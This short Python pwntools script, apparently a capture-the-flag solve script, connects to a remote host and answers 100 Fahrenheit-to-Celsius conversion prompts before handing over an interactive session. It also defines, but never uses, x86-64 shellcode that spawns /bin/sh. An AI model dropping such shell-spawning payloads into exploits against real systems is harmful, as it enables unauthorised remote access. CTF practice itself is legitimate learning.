from pwn import struct, remote

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

def p32(x):
    return struct.pack('I', x)
def p64(x):
    return struct.pack('Q', x)

r = remote('120.114.62.209', 5127)

r.recvlines(5)
for _ in range(100):
    r.recvline()
    x = int(r.recvline().decode().replace("\n", '').split(' ')[-1])
    ans = str((x-32)*5)+'/'+str(9)
    r.sendline(ans.encode())
r.interactive()